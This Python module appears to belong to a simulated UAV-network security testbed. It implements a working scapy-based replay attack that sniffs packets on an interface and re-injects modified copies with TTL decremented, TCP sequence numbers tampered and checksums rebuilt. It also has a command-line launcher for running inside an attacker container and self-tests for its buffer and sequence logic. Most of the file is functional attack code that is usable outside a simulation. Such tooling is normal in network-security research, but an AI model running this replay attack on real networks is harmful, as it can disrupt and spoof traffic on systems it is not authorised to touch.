"""
simlib/attacks_replay.py

Smart replay attack: the attacker node sniffs traffic on an interface,
buffers recent packets in a bounded queue, and periodically re-injects
modified copies.  Each replayed packet:
  - has TTL decremented by `ttl_decrement` (clamped to >= 1)
  - has its TCP sequence number tampered according to `seq_mode`
      inc:   seq += 1  (increments monotonically)
      rand:  seq <- random 32-bit
      zero:  seq <- 0
  - IP/TCP/UDP checksums are recomputed (scapy does this by deleting the
    chksum fields and letting scapy rebuild)

Typical deployment inside Topo.py:

    from simlib.attacks_replay import launch_replay_in_container
    launch_replay_in_container(
        container='mn.d3',            # attacker UAV container
        iface='any',                  # sniff interface inside container
        attack_duration_s=60,
        buffer_packets=50,
        replay_delay_ms=200,
        replay_rate_pps=10,
        ttl_decrement=5,
        seq_mode='inc',
        victim_ip=None,               # None = any; or '10.0.0.4' to filter
    )

The launcher `docker exec`s this file as a script:
    python3 /codes/simlib/attacks_replay.py --iface any --duration 60 ...

Pure-logic parts (packet modifier, seq generator, ring buffer) are testable
without scapy. Scapy is imported lazily inside the sniff/send entry points so
this module is import-safe in environments without scapy at Topo.py load time.
"""

import argparse
import collections
import random
import sys
import time


# =============== pure-logic: no scapy required ===============

class SeqTamper:
    """
    Sequence-number generator for replayed TCP packets.
    'inc'  : monotonically increasing from a seed (default 0).
    'rand' : uniformly random 32-bit on each call.
    'zero' : always returns 0.
    """
    MODES = ('inc', 'rand', 'zero')

    def __init__(self, mode, seed=None, inc_start=0):
        if mode not in self.MODES:
            raise ValueError(f"seq_mode must be in {self.MODES}, got {mode!r}")
        self.mode = mode
        self._counter = int(inc_start)
        self._rng = random.Random(seed)

    def next(self):
        if self.mode == 'inc':
            v = self._counter & 0xFFFFFFFF
            self._counter += 1
            return v
        if self.mode == 'rand':
            return self._rng.randint(0, 0xFFFFFFFF)
        return 0


class ReplayBuffer:
    """
    Bounded ring buffer of raw packet bytes (or packet objects).
    When full, oldest packets are evicted (FIFO replacement).
    """
    def __init__(self, maxlen):
        if maxlen < 1:
            raise ValueError("maxlen must be >= 1")
        self.maxlen = maxlen
        self._q = collections.deque(maxlen=maxlen)

    def push(self, pkt):
        self._q.append(pkt)

    def pop_oldest(self):
        if not self._q:
            return None
        return self._q.popleft()

    def peek_all(self):
        return list(self._q)

    def __len__(self):
        return len(self._q)


def compute_new_ttl(old_ttl, decrement):
    """TTL modification with floor of 1 (never zero, which would drop on-wire)."""
    new = int(old_ttl) - int(decrement)
    return max(new, 1)


# =============== scapy-dependent entry points (lazy imports) ===============

def _modify_packet_scapy(pkt, ttl_decrement, seq_tamper):
    """
    Mutate a scapy packet in-place-ish: return a new packet with TTL
    decremented and (if TCP) seq tampered. Forces chksum recomputation by
    clearing checksums so scapy regenerates them on serialize.

    This function imports scapy lazily so attacks_replay.py can be imported
    in environments where scapy isn't available.
    """
    # Lazy imports — only needed when this function runs
    from scapy.layers.inet import IP, TCP  # noqa: F401 (used via isinstance-like)

    new_pkt = pkt.copy()

    # IP layer: decrement TTL, clear IP chksum
    if new_pkt.haslayer(IP):
        new_pkt[IP].ttl = compute_new_ttl(new_pkt[IP].ttl, ttl_decrement)
        try:
            del new_pkt[IP].chksum
        except AttributeError:
            pass

    # TCP layer: tamper seq, clear TCP chksum
    if new_pkt.haslayer(TCP):
        new_pkt[TCP].seq = seq_tamper.next()
        try:
            del new_pkt[TCP].chksum
        except AttributeError:
            pass

    return new_pkt


def run_replay_attack(iface, duration_s,
                      buffer_packets, replay_delay_ms, replay_rate_pps,
                      ttl_decrement, seq_mode,
                      victim_ip=None, bpf_filter=None, verbose=False):
    """
    Live replay attack. Must be run inside the attacker container (needs
    raw-socket privileges).

    Spawns:
      - a sniff loop (scapy.sniff with prn=) that pushes each observed packet
        into a bounded ring buffer
      - a replay loop (threaded) that pops packets at replay_rate_pps and
        sends modified copies after replay_delay_ms delay

    Terminates cleanly when duration_s elapses.
    """
    # Lazy imports
    import threading
    try:
        from scapy.all import sniff, sendp, Ether  # noqa: F401
        from scapy.layers.inet import IP
    except Exception as e:
        print(f"[replay] scapy import failed: {e}", file=sys.stderr)
        return 2

    buf = ReplayBuffer(maxlen=buffer_packets)
    tamper = SeqTamper(mode=seq_mode)

    # Build BPF filter
    if bpf_filter is None:
        parts = ['ip']
        if victim_ip:
            parts.append(f'and host {victim_ip}')
        bpf_filter = ' '.join(parts)

    stop_event = threading.Event()
    stats = {'captured': 0, 'replayed': 0, 'dropped_modify_err': 0}

    def _on_packet(pkt):
        if stop_event.is_set():
            return
        buf.push(pkt)
        stats['captured'] += 1

    def _replay_loop():
        interval = 1.0 / max(replay_rate_pps, 1)
        delay_s = replay_delay_ms / 1000.0
        next_send = time.time() + delay_s
        while not stop_event.is_set():
            now = time.time()
            if now < next_send:
                time.sleep(min(0.01, next_send - now))
                continue
            pkt = buf.pop_oldest()
            if pkt is None:
                next_send = now + interval
                continue
            try:
                mod = _modify_packet_scapy(pkt, ttl_decrement, tamper)
                # Send at layer 2 if Ether is present, else layer 3
                if mod.haslayer('Ether'):
                    sendp(mod, iface=iface, verbose=False)
                else:
                    from scapy.all import send
                    send(mod, verbose=False)
                stats['replayed'] += 1
            except Exception as e:
                stats['dropped_modify_err'] += 1
                if verbose:
                    print(f"[replay] modify/send error: {e}", file=sys.stderr)
            next_send = now + interval

    replay_thread = threading.Thread(target=_replay_loop, daemon=True)
    replay_thread.start()

    # scapy sniff in main thread with timeout
    sniff(
        iface=iface,
        filter=bpf_filter,
        prn=_on_packet,
        store=False,
        timeout=duration_s,
    )

    stop_event.set()
    replay_thread.join(timeout=2)

    if verbose:
        print(f"[replay] done: captured={stats['captured']} "
              f"replayed={stats['replayed']} "
              f"dropped={stats['dropped_modify_err']}")
    return 0


# =============== CLI entry (for docker exec) ===============

def _main():
    ap = argparse.ArgumentParser(description="Smart replay attack (scapy-based)")
    ap.add_argument('--iface', required=True)
    ap.add_argument('--duration', type=int, required=True,
                    help='seconds to run the attack')
    ap.add_argument('--buffer', type=int, required=True,
                    help='ring buffer capacity (packets)')
    ap.add_argument('--delay-ms', type=int, required=True,
                    help='delay from capture to first replay')
    ap.add_argument('--rate-pps', type=int, required=True,
                    help='replay rate, packets per second')
    ap.add_argument('--ttl-dec', type=int, required=True)
    ap.add_argument('--seq-mode', choices=('inc', 'rand', 'zero'), required=True)
    ap.add_argument('--victim-ip', default=None)
    ap.add_argument('--verbose', action='store_true')
    args = ap.parse_args()

    return run_replay_attack(
        iface=args.iface,
        duration_s=args.duration,
        buffer_packets=args.buffer,
        replay_delay_ms=args.delay_ms,
        replay_rate_pps=args.rate_pps,
        ttl_decrement=args.ttl_dec,
        seq_mode=args.seq_mode,
        victim_ip=args.victim_ip,
        verbose=args.verbose,
    )


# =============== self-test (pure logic only, no scapy) ===============

if __name__ == '__main__' and (len(sys.argv) == 1 or sys.argv[1] == '--self-test'):
    print("=== attacks_replay.py self-test (pure-logic portions) ===\n")

    # Test 1: SeqTamper inc
    print("Test 1: SeqTamper 'inc' counts up from 0")
    t = SeqTamper('inc')
    got = [t.next() for _ in range(5)]
    assert got == [0, 1, 2, 3, 4], got
    print(f"  got {got}  OK")

    # Test 2: SeqTamper zero always 0
    print("Test 2: SeqTamper 'zero' always 0")
    t = SeqTamper('zero')
    got = [t.next() for _ in range(4)]
    assert got == [0, 0, 0, 0]
    print(f"  got {got}  OK")

    # Test 3: SeqTamper rand is seeded-reproducible and in-range
    print("Test 3: SeqTamper 'rand' seeded-reproducible, uint32 range")
    a = SeqTamper('rand', seed=42)
    b = SeqTamper('rand', seed=42)
    va = [a.next() for _ in range(10)]
    vb = [b.next() for _ in range(10)]
    assert va == vb, f"{va} vs {vb}"
    assert all(0 <= v <= 0xFFFFFFFF for v in va)
    print(f"  first 3 values: {va[:3]}   reproducible & in range: OK")

    # Test 4: SeqTamper wraps at uint32 after many increments
    print("Test 4: SeqTamper 'inc' wraps past 2**32")
    t = SeqTamper('inc', inc_start=0xFFFFFFFE)
    got = [t.next() for _ in range(4)]
    assert got == [0xFFFFFFFE, 0xFFFFFFFF, 0, 1], got
    print(f"  got {got}  OK")

    # Test 5: SeqTamper rejects bad modes
    print("Test 5: SeqTamper rejects bad mode")
    try:
        SeqTamper('bogus')
        print("  FAIL (no exception)")
    except ValueError as e:
        print(f"  OK: {e}")

    # Test 6: ReplayBuffer FIFO eviction
    print("Test 6: ReplayBuffer FIFO eviction")
    b = ReplayBuffer(maxlen=3)
    for x in ('a', 'b', 'c'):
        b.push(x)
    assert len(b) == 3
    b.push('d')
    assert len(b) == 3
    assert b.peek_all() == ['b', 'c', 'd']
    assert b.pop_oldest() == 'b'
    assert b.pop_oldest() == 'c'
    assert b.pop_oldest() == 'd'
    assert b.pop_oldest() is None  # empty -> None
    print("  OK")

    # Test 7: ReplayBuffer bad maxlen
    print("Test 7: ReplayBuffer rejects maxlen < 1")
    try:
        ReplayBuffer(0)
        print("  FAIL")
    except ValueError as e:
        print(f"  OK: {e}")

    # Test 8: compute_new_ttl
    print("Test 8: compute_new_ttl")
    for old, dec, exp in [(64, 5, 59), (10, 20, 1), (1, 0, 1), (255, 100, 155)]:
        got = compute_new_ttl(old, dec)
        status = 'OK' if got == exp else 'FAIL'
        print(f"  ttl {old} - {dec} = {got} (expect {exp}) {status}")
        assert got == exp

    print("\nattacks_replay.py self-test (pure-logic) complete.")
    print("Live sniff/replay path requires scapy + raw sockets; verify inside")
    print("the attacker Docker container on your real testbed.")
    sys.exit(0)


if __name__ == '__main__':
    sys.exit(_main())
